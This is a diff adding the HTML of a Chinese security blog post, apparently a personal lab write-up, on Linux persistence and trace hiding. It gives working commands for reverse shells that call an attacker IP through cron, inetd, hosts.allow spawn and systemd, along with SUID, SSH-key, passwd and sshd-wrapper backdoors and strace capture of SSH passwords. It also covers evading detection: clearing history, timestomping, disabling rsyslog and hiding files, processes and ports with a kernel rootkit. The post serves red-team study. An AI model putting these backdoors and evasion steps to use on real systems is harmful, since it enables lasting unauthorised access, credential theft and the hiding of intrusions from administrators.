@@ -1,0 +1,1114 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      Linux攻防-权限维持及痕迹隐藏 | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「Linux攻防-权限维持及痕迹隐藏」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" itemprop="url">
+		Linux攻防-权限维持及痕迹隐藏
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" itemprop="url">
+		<time datetime="2023-06-17T04:14:28.000Z" itemprop="dateUpdated">
+	  		2023-06-17
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/Linux/" class=" ">
+			Linux
+		</a>
+	
+		<a href="/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" class=" ">
+			系统安全
+		</a>
+	
+		<a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class=" ">
+			权限维持
+		</a>
+	
+		<a href="/tags/%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" class=" ">
+			痕迹隐藏
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="零、Linux下的控守技术概述"><a href="#零、Linux下的控守技术概述" class="headerlink" title="零、Linux下的控守技术概述"></a>零、Linux下的控守技术概述</h1><p>控守技术可以理解为权限维持技术，泛指攻击者获取目标机器的控制权限后，将该权限长久维持的技术和方法</p>
+<p>这里主要分为两大类：</p>
+<ul>
+<li>权限维持：能够在失去当前控制权限时，下次能更容易地重获权限的方法</li>
+<li>痕迹隐藏：能够使当前控制权限尽量避免被查出或杀死的技术</li>
+</ul>
+<h1 id="一、权限维持"><a href="#一、权限维持" class="headerlink" title="一、权限维持"></a>一、权限维持</h1><h2 id="1-1-定时任务后门"><a href="#1-1-定时任务后门" class="headerlink" title="1.1 定时任务后门"></a>1.1 定时任务后门</h2><p>使用<code>crontab</code>命令去定期执行一些脚本命令。例如定期执行一个反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.52.130/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后在<code>/etc/crontab</code>中添加定时任务，每分钟执行一次上面的脚本：</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616105423712.png" alt="image-20230616105423712"></p>
+<p>（验证成功）</p>
+<h2 id="1-2-SUID程序后门"><a href="#1-2-SUID程序后门" class="headerlink" title="1.2 SUID程序后门"></a>1.2 SUID程序后门</h2><p>SUID程序是一种普通用户在运行时，会拥有root权限的程序</p>
+<blockquote>
+<p>首先SUID权限仅对二进制程序有效；<br>执行者必须对这个程序有可执行的权限；<br>本权限仅在执行该程序的过程中有效；<br>在执行过程中执行者将具有该程序拥有者的权限。</p>
+</blockquote>
+<p>当我们在已经获得了root用户的权限下，要去维持这个root用户的权限时</p>
+<p>在root用户执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /bin/bash /var/.hack </span><br><span class="line"><span class="built_in">chmod</span> 4775 /var/.hack </span><br><span class="line"><span class="built_in">ls</span> -al /var/.hack</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/41ec56bd2b974e6e96b4d833d55d0d9c.png" alt="41ec56bd2b974e6e96b4d833d55d0d9c"></p>
+<p>我们通过这样的方式去留下一个SUID后门，当我们丢失了root权限，只有一个普通用户权限的时候运行以下命令，重新拿到root权限：<code>/var/.hack -p</code></p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/4c71486c539645a89e202d67747add4c.png" alt="4c71486c539645a89e202d67747add4c"></p>
+<p>（验证成功）</p>
+<h2 id="1-3-SSHKey后门"><a href="#1-3-SSHKey后门" class="headerlink" title="1.3 SSHKey后门"></a>1.3 SSHKey后门</h2><p>当我们具有写入权限的时候，我们同样可以自行生成密钥，当kali机器第一次生成密钥的时候，并且把公钥放在了你的服务器上面，当你把公钥放在服务器上面的时候，这就意味着他可以正常的解密和加密你发过来的内容，后面你就是通过加解密去认证会话的，并不需要输入密码</p>
+<p>例如生成一个密钥对：<code>ssh-keygen -t rsa</code>，攻击者将生成的公钥内容写入到目标机器（假如是是192.168.52.13）<code>/root/.ssh/authorized_keys</code>文件中，之后攻击者在攻击机上运行<code>ssh root@192.168.52.13</code>，就可以无密钥链接目标机器了</p>
+<p>（验证成功）</p>
+<h2 id="1-4-添加用户"><a href="#1-4-添加用户" class="headerlink" title="1.4 添加用户"></a>1.4 添加用户</h2><p>原理上和运行<code>useradd</code>命令类似，这里使用<code>openssl</code>生成密码并写入到<code>/etc/passwd</code></p>
+<p>执行：<code>openssl passwd -1 -salt admin 123456</code></p>
+<p><code>-1</code>是使用md5cryot加密算法，<code>-salt</code>是指定盐为admin，“123456”则是明文密码，执行后返回这个字符串“$1$admin$LClYcRe.ee8dQwgrFc5nz.”</p>
+<p>之后执行<code>echo &#39;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#39; &gt;&gt; /etc/passwd</code></p>
+<p>之后就可以在攻击机上远程连接目标主机：<code>ssh admin@192.168.52.13</code></p>
+<p>（验证失败，远程登录时显示鉴权失败）</p>
+<p>或者直接<code>useradd</code></p>
+<h2 id="1-5-SSH软连接后门"><a href="#1-5-SSH软连接后门" class="headerlink" title="1.5 SSH软连接后门"></a>1.5 SSH软连接后门</h2><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为“su”，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录</p>
+<p>在目标机器上执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/su </span><br><span class="line">/tmp/su -oPort=8080</span><br></pre></td></tr></table></figure>
+
+<p>攻击机上执行<code>ssh root@192.168.52.13 -p 8080</code>，之后的密码随意输入，即可登录靶机的root用户</p>
+<p>（验证失败，无法输入任意密码登录root）</p>
+<p>注：查看此计算机SSH是否开启PAM认证<code>cat /etc/ssh/sshd_config|grep UsePAM</code></p>
+<h2 id="1-6-SSH-Wrapper后门"><a href="#1-6-SSH-Wrapper后门" class="headerlink" title="1.6 SSH Wrapper后门"></a>1.6 SSH Wrapper后门</h2><p>在目标机器上执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/sbin/</span><br><span class="line"><span class="built_in">mv</span> sshd ../bin/    <span class="comment">#对sshd程序做备份</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span><br><span class="line"><span class="built_in">chmod</span> u+x sshd</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+
+<p>原理：启动<code>/usr/sbin/sshd</code>，脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动<code>/usr/bin/sshd</code>，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。</p>
+<p>攻击机之后再执行：<code>socat STDIO TCP4:192.168.52.132:22,sourceport=13377</code>，即可返回一个shell</p>
+<p>（验证成功）</p>
+<h2 id="1-7-Keylogger记录密码后门"><a href="#1-7-Keylogger记录密码后门" class="headerlink" title="1.7 Keylogger记录密码后门"></a>1.7 Keylogger记录密码后门</h2><p>前提是目标机器上存在<code>strace</code>工具</p>
+<p>原理：当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码。</p>
+<p>编辑<code>/root/.bashrc</code>，加入如下字段：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/.sshpwd-`date &#x27;</span>+%Y-%m-%d<span class="string">&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<p>意思是：首先alias是取一个叫ssh的别名，然后将登陆的密码日志就通过strace这个工具记录到tmp这个目录下并且以.sshpwd加上当前的日期时间为文件名的文件中</p>
+<p>之后执行<code>source .bashrc</code>使其生效</p>
+<p>所以当我们执行ssh通过root去连接的时候，或者切换用户的时候，就会将密码记录到&#x2F;tmp目录下的.sshpwd加上日期时间的日志里</p>
+<p><code>ssh root@127.0.0.1</code>，输入密码之后，之后可以在<code>/tmp</code>文件夹下找到对应生成的日志记录，可以在里面找到密码字段：</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616144848233.png" alt="image-20230616144848233"></p>
+<p>（验证成功）</p>
+<h2 id="1-8-sudoers利用后门"><a href="#1-8-sudoers利用后门" class="headerlink" title="1.8 sudoers利用后门"></a>1.8 sudoers利用后门</h2><p>sudo命令可以使用户临时获得管理员权限执行命令，sudo的控制都是基于sudoers文件来控制的，里面限制了用户名，用户组，执行什么等。</p>
+<p><code>/etc/sudoers</code>的通用格式为：user host runas command user:一位或几位用户，在&#x2F;etc&#x2F;group中可以用一个%代替它，组对象的名称一定要用百分号%开头。</p>
+<p>host:一个或几个主机名；runas:作为哪个用户运行，常见选项是root和ALL command:想让用户或组运行的一个或几个根级别命令。</p>
+<p>例如：hans ALL&#x3D;(root) useradd,userdel 授权hans用户在所有计算机上以root身份运行useradd,userdel命令。</p>
+<p>这样我们用一句话将内置&#x2F;或者我们自己添加的普通权限用户添加到sudoer列表中，这样就可以偷着执行管理员权限的命令了。将原本低权限用户当做后门使用。</p>
+<p>编辑<code>/etc/sudoers.d/README</code>，写入<code>xiaowang ALL = NOPASSWD: ALL</code>，这里的xiaowang就是丢失root权限后用来取回root权限的普通用户（前提xiaowang用户需要事先存在）</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616151434413.png" alt="image-20230616151434413"></p>
+<p>此时我们切换为普通用户xiaowang以模仿实战中我们丢失了root身份，然后我们执行<code>sudo -i</code>即可重新拿回root身份</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616151447995.png" alt="image-20230616151447995"></p>
+<p>（验证成功）</p>
+<h2 id="1-9-Strace监听SSH来源流量记录密码"><a href="#1-9-Strace监听SSH来源流量记录密码" class="headerlink" title="1.9 Strace监听SSH来源流量记录密码"></a>1.9 Strace监听SSH来源流量记录密码</h2><p>strace不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用</p>
+<p>之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量</p>
+<p>执行以下代码：<code>strace -f -p &#123;sshd进程的PID&#125; -o /tmp/.ssh.log -e trace=read,write,connect -s 2048</code></p>
+<p>此时我们任何使用ssh登录或者切换用户的操作，密码都会被记录到&#x2F;tmp&#x2F;.ssh.log文件中，可以在其中抓取到密码</p>
+<h2 id="1-10-inetd远程后门"><a href="#1-10-inetd远程后门" class="headerlink" title="1.10 inetd远程后门"></a>1.10 inetd远程后门</h2><p>前提是目标机器有已安装<code>openbsd-inetd</code></p>
+<p>inetd，也叫作“超级服务器”，就是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。</p>
+<p>inetd.conf则是inetd的配置文件。inetd.conf文件告诉inetd监听哪些网络端口，为每个端口启动哪个服务。</p>
+<p>位置是&#x2F;etc&#x2F;inetd.conf 配置格式：[servicename] [socktype] [proto] [flags] [user] [server_path] [args] 在配置文件下写入以下内容：</p>
+<p><code>daytime stream tcp nowait root /bin/bash bash -i</code></p>
+<p>意思是：</p>
+<blockquote>
+<p>daytime服务（13端口） 套接字类型 协议类型 不等待  用户组     提供服务的程序<br>daytime             stream   tcp     nowait root     &#x2F;bin&#x2F;bash bash -i</p>
+</blockquote>
+<p>之后启动服务：<code>inetd</code></p>
+<p>之后攻击机直接用这个命令就能远程连接拿到root shell：<code>nc 192.168.52.13 13</code></p>
+<p>（验证成功）</p>
+<h2 id="1-11-TCP-Wrappers反弹shell后门"><a href="#1-11-TCP-Wrappers反弹shell后门" class="headerlink" title="1.11 TCP Wrappers反弹shell后门"></a>1.11 TCP Wrappers反弹shell后门</h2><p>TCPWrappers是一个工作在第四层（传输层）的的安全工具，对有状态连接的特定服务进行安全检测并实现访问控制，凡是包含libwrap.so库文件的的程序就可以受TCPWrappers的安全控制。它的主要功能就是控制谁可以访问，常见的程序有rpcbind、vsftpd、sshd，telnet。</p>
+<p>TCP_Wrappers有一个TCP的守护进程叫做tcpd。以ssh为例，每当有ssh的连接请求时，tcpd即会截获请求，先读取系统管理员所设置的访问控制文件，符合要求，则会把这次连接原封不动的转给真正的ssh进程，由ssh完成后续工作；如果这次连接发起的ip不符合访问控制文件中的设置，则会中断连接请求，拒绝提供ssh服务。</p>
+<p>TCP_Wrappers的使用主要是依靠两个配置文件<code>/etc/hosts.allow</code>, <code>/etc/hosts.deny</code>，用于拒绝和接受。这里演示使用的是接受配置信息。之所以能够被用作后门是因为他存在一个参数是spawn （spawn启动一个外部程序完成执行的操作） 修改<code>/etc/hosts.allow</code>文件，向其中添加以下命令：</p>
+<p><code>ALL: ALL: spawn (bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/攻击机IP/6666 0&gt;&amp;1&quot;) &amp; :allow</code></p>
+<p>之后攻击机开启监听：<code>nc -lvp 6666</code></p>
+<p>当目标主机使用ssh连接的时候（例如执行<code>ssh root@127.0.0.1</code>），它开始匹配规则，然后利用spawn执行的nc反弹了一个root权限的shell：</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616162908956.png" alt="image-20230616162908956"></p>
+<p>（验证成功）</p>
+<h2 id="1-12-systemd服务后门"><a href="#1-12-systemd服务后门" class="headerlink" title="1.12 systemd服务后门"></a>1.12 systemd服务后门</h2><p>Linux下的服务启动后门，可创建或配置系统服务文件中的“ExecStart”参数，实现启动服务时，调用恶意代码的执行。</p>
+<p>在<code>/usr/lib/systemd/system</code>中创建自己的服务描述文件：<code>touch hack.service</code>，并写入以下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Just test.</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/bin/bash bash -i &gt;&amp; /dev/tcp/10.10.10.131/7777 0&gt;&amp;1</span><br><span class="line">ExecReload=</span><br><span class="line">ExecStop=</span><br><span class="line">PrivateTmp=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<p>接着加入可执行权限：<code>sudo chmod 755 hack.service</code></p>
+<p>攻击机监听：<code>nc -lvp 7777</code></p>
+<p>接着目标机器启动所创建服务，攻击机就可以得到一个root shell</p>
+<p>（验证失败，目标机器无法启动hack服务）</p>
+<h1 id="二、痕迹隐藏"><a href="#二、痕迹隐藏" class="headerlink" title="二、痕迹隐藏"></a>二、痕迹隐藏</h1><h2 id="2-1-history命令记录"><a href="#2-1-history命令记录" class="headerlink" title="2.1 history命令记录"></a>2.1 history命令记录</h2><p><code>[space] set +o history</code>：关闭<code>history</code>命令记录，前面加上空格的话，这条命令本身也不会被记录</p>
+<p><code>[space] set -o history</code>：重新打开<code>history</code>命令记录</p>
+<p><code>history -d [num]</code>：删除指定编号的命令记录（编号为执行<code>history</code>时前面的数字）</p>
+<p>此外执行命令时，一开始加空格也可以临时不记录命令执行</p>
+<p>同时用户目录下的<code>.bash_history</code>就是记录当前用户命令记录的文件</p>
+<h2 id="2-2-修改文件创建时间"><a href="#2-2-修改文件创建时间" class="headerlink" title="2.2 修改文件创建时间"></a>2.2 修改文件创建时间</h2><p><code>touch -r index.php hack.php</code>：将hack.php文件的时间属性改成与index.php文件相同，以此逃避通过检测文件修改时间来判断是否为后门的检测方式</p>
+<h2 id="2-3-文件锁定"><a href="#2-3-文件锁定" class="headerlink" title="2.3 文件锁定"></a>2.3 文件锁定</h2><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php 	<span class="comment"># 锁定文件</span></span><br><span class="line"><span class="built_in">rm</span> -rf evil.php   	<span class="comment"># 提示禁止删除</span></span><br><span class="line">lsattr evil.php  	<span class="comment"># 属性查看</span></span><br><span class="line">chattr -i evil.php 	<span class="comment"># 解除锁定</span></span><br><span class="line"><span class="built_in">rm</span> -rf evil.php   	<span class="comment"># 彻底删除文件</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-4-隐藏SSH登录记录"><a href="#2-4-隐藏SSH登录记录" class="headerlink" title="2.4 隐藏SSH登录记录"></a>2.4 隐藏SSH登录记录</h2><p>当我们用ssh进行登录时，就会记录，信息包括登录的账号，远程登录的主机，登录时间。</p>
+<p>ssh加上-T参数，可以进行隐藏登录记录，不被w、who、last等指令检测到</p>
+<p><code>ssh -T -i id_rsa root@192.168.110.131 /bin/bash -i</code></p>
+<h2 id="2-5-关闭系统日志功能（待验证）"><a href="#2-5-关闭系统日志功能（待验证）" class="headerlink" title="2.5 关闭系统日志功能（待验证）"></a>2.5 关闭系统日志功能（待验证）</h2><p>编辑<code>/etc/rsyslog.conf</code>以及<code>/etc/rsyslog.d/</code>下的所有配置文件，注释掉各项即可关闭对应的日志记录功能（不再把日志信息记录到指定文件）</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616200914820.png" alt="image-20230616200914820"></p>
+<p>不排除有其他相关设置的可能</p>
+<p>关闭系统日志功能：<code>systemctl stop rsyslog</code>、<code>systemctl disable rsyslog</code>（具体效果待检验）</p>
+<h2 id="2-6-rootkit"><a href="#2-6-rootkit" class="headerlink" title="2.6 rootkit"></a>2.6 rootkit</h2><h3 id="2-6-1-概述"><a href="#2-6-1-概述" class="headerlink" title="2.6.1 概述"></a>2.6.1 概述</h3><p>rootkit是一种用于捕获流经计算机的密码和消息流量的黑客安全工具。一组提供系统后门，收集网络上其他系统信息，掩盖系统受损事实等功能的黑客工具。</p>
+<p>大体上可以分为三类：</p>
+<ul>
+<li>应用级rootkit：主要替换一些系统工具或应用程序，或修改.rhosts等系统配置文件等</li>
+<li>硬件级rootkit：在系统加载前获得控制权，通过向磁盘中写入文件再由引导程序加载该文件重新获得控制权，使整个操作系统运行在rootkit的掌握之中</li>
+<li>内核级rootkit：介于两者之间，以操作系统的内核级特权（ring 0）运行，下面主要讨论内核级rootkit的使用</li>
+</ul>
+<p>内核级rootkit最简单的实现方法就是编写一个内核模块（kernel module），编写并编译形成.ko文件，通过sudo insmod命令即可将rootkit安装到系统中。</p>
+<p>一个内核级rootkit最基本的功能有以下几种：</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616204352102.png" alt="image-20230616204352102"></p>
+<p>需要注意的是内核级rootkit对Linux内核版本的要求比较严格，植入内核级rootkit时一定要注意与内核版本相对应</p>
+<h3 id="2-6-2-基本功能实现思路"><a href="#2-6-2-基本功能实现思路" class="headerlink" title="2.6.2 基本功能实现思路"></a>2.6.2 基本功能实现思路</h3><p>下面的演示对应的系统及内核版本为：Ubuntu 20.04、Linux 5.4.0-52</p>
+<p>内核级rootkit最基本的实现思路，就是hook系统调用：</p>
+<ol>
+<li><p>执行系统命令</p>
+</li>
+<li><p>执行目标系统调用时劫持</p>
+</li>
+<li><p>运行自己的hook函数</p>
+</li>
+<li><p>直接返回或者返回原始系统调用</p>
+</li>
+<li><p>完成指定功能</p>
+</li>
+</ol>
+<p>如下图所示</p>
+<img src="image-20230616204547362.png" alt="image-20230616204547362" style="zoom:33%;" />
+
+
+
+<p><strong>文件隐藏</strong></p>
+<p>比如要实现文件隐藏的功能，具体的原理和思路如下所示：</p>
+<p>用户执行ls等命令时，会调用sys_getdents64()以读取目录列表，返回读取的所有条目的总字节长度，并返回到用户空间并输出</p>
+<p>64位Linux使用linux_dirent64结构对一个目录条目进行描述（directory entry）：</p>
+<img src="image-20230616204921397.png" alt="image-20230616204921397" style="zoom:33%;" />
+
+<p>其中的重点字段：</p>
+<ul>
+<li>d_reclen：当前条目对象的字节长度，用于定位下一个条目</li>
+<li>d_name：当前条目的名称</li>
+</ul>
+<p>当ls命令执行时，通过以下步骤进行拦截回显：</p>
+<p><img src="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/image-20230616205159636.png" alt="image-20230616205159636"></p>
+<ol>
+<li>用户调用ls等命令，拦截<code>sys_getdents64()</code>的返回内容</li>
+<li>复制到内核空间，找到要隐藏的条目cur_dir以及其上一个条目pre_dir</li>
+<li>pre_dir.d_reclen +&#x3D; cur_dir.d_reclen，从而遍历时跳过待隐藏条目</li>
+<li>将修改后的结果返回给用户空间</li>
+<li>输出时隐藏了file2的显示（但条目依然存在）</li>
+</ol>
+<p><strong>进程隐藏</strong></p>
+<p>几乎所有提供进程信息的用户空间工具都通过读取&#x2F;proc&#x2F;下的文件来获取信息，因此进程隐藏可以在文件隐藏的基础上完成实现，只需隐藏&#x2F;proc&#x2F;下带有待隐藏进程PID前缀的所有条目即可（循环遍历）</p>
+<p><strong>端口隐藏</strong></p>
+<p>以ipv4下的tcp端口为例，读取端口信息时会循环调用tcp4_seq_show()函数，从而把获取的信息返回到用户空间</p>
+<p>获取到的信息涉及到一个叫sock_common的对象，其中sck_num字段指代端口号，因此得到了隐藏端口显示的切入点</p>
